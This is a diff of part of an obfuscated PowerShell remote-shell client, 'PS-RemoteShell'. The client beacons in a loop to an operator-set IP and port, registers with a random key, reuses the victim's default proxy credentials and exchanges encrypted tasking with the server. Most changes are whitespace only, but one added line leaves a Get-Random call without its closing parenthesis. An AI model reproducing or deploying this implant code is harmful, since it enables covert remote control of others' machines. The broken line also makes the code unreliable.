@@ -178,11 +178,13 @@ function PS-RemoteShell {
         $VAR18 = VAR51 -Length 16
         $VAR19 = VAR50
         $VAR21 = "register $($VAR18) $($VAR19)"
-		$VAR30 = [GUID]::NewGuid()
+        $VAR30 = [GUID]::NewGuid()
         (New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
         
         While($VAR17 -ne $True) {
-          $VAR22 = VAR51 -Length $(Get-Random -Minimum 5 -Maximum 16)
+            $VAR26 = ""
+            $VAR22 = VAR51 -Length $(Get-Random -Minimum 5 -Maximum 16
+			
             if ($Protocol -eq "https") {
                 $VAR20 = @"
                     using System.Net;
@@ -202,14 +204,14 @@ function PS-RemoteShell {
             }
                     
             $VAR23 = ""
-			Start-Sleep -m $Delay
+            Start-Sleep -m $Delay
             $VAR37 = "$($Protocol)://$($Ip):$($Port)/$($VAR22)?$($VAR18)"
             $VAR21 = VAR54 -Buffer $VAR21 -Key $Key
             Try {
                 $VAR24 = VAR55 -Url $VAR37 -Data $VAR21 -UUID $VAR30
-				$VAR13 = $VAR24 | ConvertFrom-Json
-				$VAR30 = $VAR13.ID
-				$VAR24 = $VAR13.Data
+                $VAR13 = $VAR24 | ConvertFrom-Json
+                $VAR30 = $VAR13.ID
+                $VAR24 = $VAR13.Data
                 $VAR23 = VAR53 -Buffer $VAR24 -Key $Key
             } Catch {
                 $VAR23 = ""
@@ -225,7 +227,7 @@ function PS-RemoteShell {
             }
             
             $VAR27 = ($error[0] | Out-String)
-		$error.Clear()
+            $error.Clear()
             
             if([string]::IsNullOrEmpty($VAR26) -And [string]::IsNullOrEmpty($VAR27)) {
                 $VAR28 = Get-Random -Maximum 50 -Minimum 1
